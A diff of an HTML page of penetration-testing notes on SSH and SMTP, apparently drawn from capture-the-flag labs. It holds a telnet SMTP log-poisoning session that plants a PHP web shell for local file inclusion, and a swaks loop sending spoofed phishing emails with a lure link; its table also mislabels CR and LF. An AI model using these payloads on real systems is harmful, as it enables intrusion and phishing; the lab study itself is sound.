@@ -204,13 +204,13 @@ layout: default
         <li>Metasploit ssh_login</li>
         <li>Bruteforcing can lock you out.  Possibly for a set period of time.</li>
     </ul>
+    
     <li>Sometimes the password prompt is disabled and login is only allowed using a private key</li>
     <li>SSH Key Fingerprint</li>
     <ul>
-        <li>Based on the hosts public key
-            <li>/etc/ssh/ssh_host_rsa_key.pub</li>
-            <li>Used for easy identification of the hosts public key</li>
-        </li>
+        <li>Based on the hosts public key</li>
+        <li>/etc/ssh/ssh_host_rsa_key.pub</li>
+        <li>Used for easy identification of the hosts public key</li>
     </ul>
     
     <table>
@@ -228,65 +228,55 @@ layout: default
     
     <h2>25 TCP / SMTP</h2>
     
+    <li>Simple Mail Transfer Protocol</li>
     <ul>
-        <li>Simple Mail Transfer Protocol</li>
-        <ul>
-            <li>SMTP Commands:
-                <table>
-                    <tr>
-                        <td>VRFY &lt;username&gt;</td>
-                        <td>asks a server to verify an email address</td>
-                    </tr>
-                    <tr>
-                        <td>EXPN</td>
-                        <td>Asks the server for the membership of a mailing list</td>
-                    </tr>
-                </table>
-            </li>
-            <li>Sends mail</li>
-            <li>On internal networks you can typically send emails as anybody</li>
-            <li>SMTP poisoning
-                <pre>&#13;&#10;telnet 10.0.0.12 25&#13;&#10;Trying 10.0.0.12...&#13;&#10;Connected to 10.0.0.12.&#13;&#10;Escape character is &apos;^]&apos;.&#13;&#10;220 symfonos.localdomain ESMTP Postfix (Debian/GNU)&#13;&#10;HELO example.com&#13;&#10;250 symfonos.localdomain&#13;&#10;mail from: hacker@example.com&#13;&#10;250 2.1.0 Ok&#13;&#10;rcpt to: helios@symfonos.localdomain&#13;&#10;250 2.1.5 Ok&#13;&#10;data&#13;&#10;354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;&#13;&#10;subject: &#13;&#10;&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]); ?&gt;&#13;&#10;.&#13;&#10;250 2.0.0 Ok: queued as 8A6884082B&#13;&#10;quit&#13;&#10;221 2.0.0 Bye&#13;&#10;Connection closed by foreign host.&#13;&#10;                </pre>
-            </li>
-            <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
-        </ul>
+        <li>SMTP Commands:</li>
+        <table>
+            <tr>
+                <td>VRFY &lt;username&gt;</td>
+                <td>asks a server to verify an email address</td>
+            </tr>
+            <tr>
+                <td>EXPN</td>
+                <td>Asks the server for the membership of a mailing list</td>
+            </tr>
+        </table>
+        
+        <li>Sends mail</li>
+        <li>On internal networks you can typically send emails as anybody</li>
+        <li>SMTP poisoning</li>
+        <pre>&#13;&#10;telnet 10.0.0.12 25&#13;&#10;Trying 10.0.0.12...&#13;&#10;Connected to 10.0.0.12.&#13;&#10;Escape character is &apos;^]&apos;.&#13;&#10;220 symfonos.localdomain ESMTP Postfix (Debian/GNU)&#13;&#10;HELO example.com&#13;&#10;250 symfonos.localdomain&#13;&#10;mail from: hacker@example.com&#13;&#10;250 2.1.0 Ok&#13;&#10;rcpt to: helios@symfonos.localdomain&#13;&#10;250 2.1.5 Ok&#13;&#10;data&#13;&#10;354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;&#13;&#10;subject: &#13;&#10;&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]); ?&gt;&#13;&#10;.&#13;&#10;250 2.0.0 Ok: queued as 8A6884082B&#13;&#10;quit&#13;&#10;221 2.0.0 Bye&#13;&#10;Connection closed by foreign host.&#13;&#10;                </pre>
+        <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
     </ul>
+    
     <li>Tools</li>
+    
+    <li>nc</li>
     <ul>
-        <li>nc
-            <ul>
-                <li>Use nc -nvC to implement a full CRLF, sometimes this is needed if a response is not being received from the server
-                    <table>
-                        <tr>
-                            <td>CR - Carriage Return</td>
-                            <td>\n</td>
-                        </tr>
-                        <tr>
-                            <td>LF - Line Feed</td>
-                            <td>\r</td>
-                        </tr>
-                    </table>
-                </li>
-            </ul>
-        </li>
+        <li>Use nc -nvC to implement a full CRLF, sometimes this is needed if a response is not being received from the server</li>
+        <table>
+            <tr>
+                <td>CR - Carriage Return</td>
+                <td>\n</td>
+            </tr>
+            <tr>
+                <td>LF - Line Feed</td>
+                <td>\r</td>
+            </tr>
+        </table>
     </ul>
+    
     <li>Telnet</li>
-    <li>swaks
+    <li>swaks</li>
+    <ul>
+        <li>Swiss Army Knift SMTP</li>
         <ul>
-            <li>Swiss Army Knift SMTP
-                <li>
-                    <table>
-                        <tr>
-                            <tr>Bash script to send emails to a list</tr>
-                            <tr>
-                                <pre>&#13;&#10;for email in $(cat email.lst);&#13;&#10;do&#13;&#10;swaks \&#13;&#10;--from support@sneakymailer.htb \&#13;&#10;--to $email \&#13;&#10;--header &apos;Subject: Please Register Your Account&apos; \&#13;&#10;--body &apos;http://10.10.14.106/test&apos; \&#13;&#10;--server sneakymailer.htb&#13;&#10;done;&#13;&#10;                                </pre>
-                            </tr>
-                        </tr>
-                    </table>
-                </li>
-            </li>
+            <li>Bash script to send emails to a list</li>
+            <pre>&#13;&#10;for email in $(cat email.lst);&#13;&#10;do&#13;&#10;swaks \&#13;&#10;--from support@sneakymailer.htb \&#13;&#10;--to $email \&#13;&#10;--header &apos;Subject: Please Register Your Account&apos; \&#13;&#10;--body &apos;http://10.10.14.106/test&apos; \&#13;&#10;--server sneakymailer.htb&#13;&#10;done;&#13;&#10;                                </pre>
         </ul>
-    </li>
+        
+        
+    </ul>
     <li>Thunderbird
         <ul>
             <li>Mail client</li>
